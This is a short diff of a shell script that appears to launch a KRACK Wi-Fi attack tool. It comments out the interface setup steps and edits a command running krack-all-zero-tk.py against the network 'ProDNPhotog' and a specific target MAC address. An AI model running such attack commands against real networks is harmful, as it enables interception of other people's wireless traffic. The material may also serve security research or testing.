@@ -51,10 +51,10 @@ undo_rename() {
 }
 
 #init
-rfkill unblock wifi
-iwconfig txpower wlx503eaa527cb7 40 #Set tramit power to 40
-reset
-rename_interface
-./krack-all-zero-tk.py -d wlp4s0 wlb ProDNPhotog --target "30:07:4D:3A:96:04"
-undo_rename
-reset
+#rfkill unblock wifi
+#iwconfig txpower wlx503eaa527cb7 40 #Set tramit power to 40
+#reset
+#rename_interface
+./krack-all-zero-tk.py -d wlp4s0 wlx503eaa527cb7 ProDNPhotog --target "30:07:4D:3A:96:04"
+#undo_rename
+#reset
